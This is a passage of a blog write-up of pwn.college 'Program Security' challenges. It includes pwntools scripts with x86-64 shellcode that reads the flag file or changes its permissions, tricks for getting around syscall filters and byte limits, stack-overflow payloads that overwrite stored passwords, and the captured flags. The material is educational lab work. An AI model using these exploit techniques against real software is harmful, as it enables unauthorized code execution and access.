#print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1766852606250-1c87facf-fbfa-47ca-8099-b9945ba6e52d.png" srcset="/img/loading.gif" lazyload></p>
+<p><font style="color:#DF2A3F;">last but not least</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1766853222403-4ab7036e-06d5-4101-83bb-dcaae9b220c4.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1766853277641-18c6145e-1672-4e91-84b5-6c288112be1b.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Syscall-Smuggler"><a href="#Syscall-Smuggler" class="headerlink" title="Syscall Smuggler"></a><font style="color:#2F8EF4;">Syscall Smuggler</font></h5><p>ban system call?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/syscall-smuggler&#x27;<br><br><br>p = process(&#x27;/challenge/syscall-smuggler&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    sub rsp, 0x600<br>    mov byte ptr [rsp+0x500], 0x0f<br>    mov byte ptr [rsp+0x501], 0x05<br>    mov byte ptr [rsp+0x502], 0xc3<br>    lea rbp, [rsp+0x500]<br><br>    xor eax, eax<br>    push rax<br>    mov dword ptr [rsp], 0x616c662f<br>    mov byte  ptr [rsp+4], 0x67<br>    push rsp<br>    pop  rdi    <br><br>    xor esi, esi<br>    xor edx, edx<br>    mov eax, 2<br>    call rbp          <br><br>    mov edi, eax       <br>    push rsp<br>    pop  rsi          <br>    mov edx, 0x100<br>    xor eax, eax<br>    call rbp            <br><br>    mov edx, eax<br>    mov edi, 1<br>    push rsp<br>    pop  rsi<br>    mov eax, 1<br>    call rbp           <br><br>    mov eax, 60<br>    xor edi, edi<br>    call rbp<br>&#x27;&#x27;&#x27;)<br><br><br><br>print(shellcode.hex())<br><br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768154778149-d031f63e-9897-417d-8a1a-d8a85bca4178.png" srcset="/img/loading.gif" lazyload></p>
+<p>Executing shellcode!</p>
+<p>pwn.college{0n9X6BuBUNfXiWtDy98CYodCZOW.dFjMywSNzEDO0EzW}</p>
+<h5 id="Syscall-Shenanigans"><a href="#Syscall-Shenanigans" class="headerlink" title="Syscall Shenanigans"></a><font style="color:#2F8EF4;">Syscall Shenanigans</font></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/syscall-shenanigans&#x27;<br><br><br>p = process(&#x27;/challenge/syscall-shenanigans&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    sub rsp, 0x600<br>    mov byte ptr [rsp+0x500], 0x0f<br>    mov byte ptr [rsp+0x501], 0x05<br>    mov byte ptr [rsp+0x502], 0xc3<br>    lea rbp, [rsp+0x500]<br><br>    xor eax, eax<br>    push rax<br>    mov dword ptr [rsp], 0x616c662f<br>    mov byte  ptr [rsp+4], 0x67<br>    push rsp<br>    pop  rdi    <br><br>    xor esi, esi<br>    xor edx, edx<br>    mov eax, 2<br>    call rbp          <br><br>    mov edi, eax       <br>    push rsp<br>    pop  rsi          <br>    mov edx, 0x100<br>    xor eax, eax<br>    call rbp            <br><br>    mov edx, eax<br>    mov edi, 1<br>    push rsp<br>    pop  rsi<br>    mov eax, 1<br>    call rbp           <br><br>    mov eax, 60<br>    xor edi, edi<br>    call rbp<br>&#x27;&#x27;&#x27;)<br><br><br><br>print(shellcode.hex())<br><br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>#p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
+
+<p>Executing shellcode!</p>
+<p>pwn.college{AWqnDzRO-SIQzYyTYm30EtFp1Ue.dJjMywSNzEDO0EzW}</p>
+<h5 id="Byte-Budget"><a href="#Byte-Budget" class="headerlink" title="Byte Budget"></a><font style="color:#2F8EF4;">Byte Budget</font></h5><p>pwndbg&gt; vmmap</p>
+<p>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</p>
+<pre><code class="hljs">         Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+
+    0x2e0a9000         0x2e0aa000 rwxp     1000       0 [anon_2e0a9]
+</code></pre>
+<p>good</p>
+<p>we only have 18byte ,so first read(0, 0x2e0a9000, 0x100) ,then jmp 0x2e0a9000</p>
+<p>and inject shellcode</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768420380304-8bf6a90b-ea34-4b49-9223-18d40a3a22a9.png" srcset="/img/loading.gif" lazyload></p>
+<p>0x000062f6fde2c7b5 &lt;+590&gt;:   call   0x62f6fde2c200 &lt;mprotect@plt&gt;</p>
+<p>   0x000062f6fde2c7ba &lt;+595&gt;:   test   eax,eax</p>
+<p>   0x000062f6fde2c7bc &lt;+597&gt;:   je     0x62f6fde2c7dd &lt;main+630&gt;</p>
+<p>bad</p>
+<p>we have to do all in 18byte</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768458401815-8f9db28a-35c3-4d3d-b1a7-2e7bd2951c46.png" srcset="/img/loading.gif" lazyload></p>
+<p>6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/byte-budget&#x27;<br><br><br>p = process(&#x27;/challenge/byte-budget&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    push 0x61<br>    mov rdi,rsp<br>    push 4<br>    pop rsi<br>    push 0x5a<br>    pop rax<br>    syscall           <br>&#x27;&#x27;&#x27;)<br><br><br><br>print(shellcode.hex())<br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>#p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br>#p.recvuntil(b&quot;Executing shellcode!&quot;)<br>#p.send(shellcode1)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768466903974-bf584439-d493-4d95-b79f-9fbedbcba590.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="ClobberCode"><a href="#ClobberCode" class="headerlink" title="ClobberCode"></a><font style="color:#2F8EF4;">ClobberCode</font></h5><p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an instruction is an <code>INT 3</code></p>
+<p>we can inject nop and jmp </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/clobbercode&#x27;<br><br><br>p = process(&#x27;/challenge/clobbercode&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    push 0x61<br>    mov rdi,rsp<br>    push 4<br>    pop rsi<br>    jmp next<br>    .rept 0xa<br>    nop<br>    .endr<br><br>next:<br>    push 0x5a<br>    pop rax<br>    syscall           <br>&#x27;&#x27;&#x27;)<br><br><br><br>print(shellcode.hex())<br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>#p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br>#p.recvuntil(b&quot;Executing shellcode!&quot;)<br>#p.send(shellcode1)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768486492532-13a3e7ac-cfdb-4b95-9fbe-2f305b1fa627.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Diverse-Deilvery"><a href="#Diverse-Deilvery" class="headerlink" title="Diverse Deilvery"></a><font style="color:#2F8EF4;">Diverse Deilvery</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768498420237-d5d897f3-70e3-4961-9688-c79a5690b921.png" srcset="/img/loading.gif" lazyload></p>
+<p>b read ,rsi &#x3D; 0</p>
+<p>pwndbg&gt; x&#x2F;10wx 0x1b90c000</p>
+<p>0x1b90c000:     0x00000000      0x00000000      0x00000000      0x00000000</p>
+<p>0x1b90c010:     0x00000000      0x00000000      0x00000000      0x00000000</p>
+<p>0x1b90c020:     0x00000000      0x00000000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/diverse-delivery&#x27;<br><br><br>p = process(&#x27;/challenge/diverse-delivery&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    push 0x61<br>    mov rdi,rsp<br>    mov bl,4<br>    xor esi,ebx<br>    mov al,0x5a<br>    syscall           <br>&#x27;&#x27;&#x27;)<br><br><br><br>print(shellcode.hex())<br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>#p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br>#p.recvuntil(b&quot;Executing shellcode!&quot;)<br>#p.send(shellcode1)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>hacker@program-security<del>diverse-delivery:</del>$ cat a</p>
+<p>pwn.college{odvhbMJ9eSmWR8JDmiba-Mq6zkt.dhjMywSNzEDO0EzW}</p>
+<h5 id="Pocket-Payload"><a href="#Pocket-Payload" class="headerlink" title="Pocket Payload"></a><font style="color:#2F8EF4;">Pocket Payload</font></h5><p>Reading 0xc bytes</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/pocket-payload&#x27;<br><br><br>p = process(&#x27;/challenge/pocket-payload&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    push 0x61<br>    mov rdi, rsp<br>    xor esi, 0x4<br>    mov al, 0x5a<br>    syscall           <br>&#x27;&#x27;&#x27;)<br><br><br><br>print(shellcode.hex())<br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>#p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br>#p.recvuntil(b&quot;Executing shellcode!&quot;)<br>#p.send(shellcode1)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>hacker@program-security<del>pocket-payload:</del>$ cat a</p>
+<p>pwn.college{MzwxkZERllXUBKPr89SXDrMw0-A.dljMywSNzEDO0EzW}</p>
+<h5 id="Micro-Menace"><a href="#Micro-Menace" class="headerlink" title="Micro Menace"></a><font style="color:#2F8EF4;">Micro Menace</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768501526577-26bdc21e-80c8-4c65-9e7a-dbc034a0855f.png" srcset="/img/loading.gif" lazyload></p>
+<p>rax&#x3D;0,read</p>
+<p>after Executing shellcode</p>
+<p>0x1b90c000         0x1b90d000 rwxp     1000       0 [anon_1b90c]</p>
+<p>first read ,then inject</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/micro-menace&#x27;<br><br><br>p = process(&#x27;/challenge/micro-menace&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>    xor edi, edi<br>    mov esi, edx<br>    syscall           <br>&#x27;&#x27;&#x27;)<br>shellcode1 = asm(&#x27;&#x27;&#x27;<br>    .rept 0x6<br>    nop<br>    .endr<br>    push 0x61<br>    mov rdi, rsp<br>    xor esi, 0x4<br>    mov al, 0x5a<br>    syscall           <br>&#x27;&#x27;&#x27;)<br><br><br>print(shellcode.hex())<br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>#p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br><br>p.recvuntil(b&quot;Executing shellcode!&quot;)<br>p.send(shellcode1)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    #print(out)<br><br>print(out.decode(errors=&#x27;ignore&#x27;))<br>print(&#x27;fuck&#x27;)<br>print(repr(out))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768504095492-d30c3f3d-9ba2-4533-945b-97bf2150f3b5.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="Memory-Corruption-Challenges"><a href="#Memory-Corruption-Challenges" class="headerlink" title="Memory Corruption Challenges"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Memory Corruption Challenges</font></h4><h5 id="Login-Leakage-Easy"><a href="#Login-Leakage-Easy" class="headerlink" title="Login Leakage (Easy) "></a><font style="color:#2F8EF4;">Login Leakage (Easy) </font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768754071744-6eaa754f-3887-4a34-8742-9c6e00ebc7c5.png" srcset="/img/loading.gif" lazyload></p>
+<p>easy</p>
+<p>check password and call win</p>
+<p>we can overwrite the password and inject “ps\0”</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768759270509-5d7fab55-68de-44fe-9a5b-d69e816935c6.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768759288262-f381c903-f2a3-40fc-ae2e-52d2472647e6.png" srcset="/img/loading.gif" lazyload></p>
+<p>we get the start of buffer</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768761361194-6296a809-5970-4d71-a213-af2cd44225ac.png" srcset="/img/loading.gif" lazyload></p>
+<p>cmp the password</p>
+<p>obviously,password is at rbp - 0x4f0 + 0x4d5</p>
+<p>offset&#x3D;0x4d5&#x3D;1237</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>p = process(&#x27;/challenge/login-leakage-easy&#x27;)<br><br>out=p.recvuntil(b&#x27;Payload size:&#x27;)<br><br>offset = 1237<br>ps = b&quot;A\x00&quot;<br>nop_len = offset - len(ps)<br>nop = b&quot;\x90&quot; * nop_len<br><br>payload = ps + nop + ps<br>p.sendline(str(len(payload)).encode())<br>out+=p.recvuntil(b&#x27;Send your payload&#x27;)<br>p.send(payload)<br><br>out += p.recvall(timeout=2)<br><br><br>print(out.decode(errors=&#x27;replace&#x27;))<br>p.close()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768758325800-d06efa8c-7e97-4094-91d0-02f56c967a0a.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Login-Leakage-Hard"><a href="#Login-Leakage-Hard" class="headerlink" title="Login Leakage (Hard)"></a><font style="color:#2F8EF4;">Login Leakage (Hard)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768761856985-2a4cc0d7-910d-4efd-a4bc-7341aeed19dc.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>p = process(&#x27;/challenge/login-leakage-hard&#x27;)<br><br>out=p.recvuntil(b&#x27;Payload size:&#x27;)<br><br>offset = 0xe11<br>ps = b&quot;A\x00&quot;<br>nop_len = offset - len(ps)<br>nop = b&quot;\x90&quot; * nop_len<br><br>payload = ps + nop + ps<br>p.sendline(str(len(payload)).encode())<br>out+=p.recvuntil(b&#x27;Send your payload&#x27;)<br>p.send(payload)<br><br>out += p.recvall(timeout=2)<br><br><br>print(out.decode(errors=&#x27;replace&#x27;))<br>p.close()<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768761954124-66cb37e3-bf76-4909-b1e6-a64f61534117.png" srcset="/img/loading.gif" lazyload></p>
+<h5 id="Bounds-Breaker-Easy"><a href="#Bounds-Breaker-Easy" class="headerlink" title="Bounds Breaker (Easy)"></a><font style="color:#2F8EF4;">Bounds Breaker (Easy)</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768762229474-7cf6267d-0530-47cb-99db-c3d40d631709.png" srcset="/img/loading.gif" lazyload></p>
+<p>well</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1768812336560-548c9a03-4d4d-4295-9df4-dcf0baadc277.png" srcset="/img/loading.gif" lazyload></p>
+<p>send “-1”?</p>
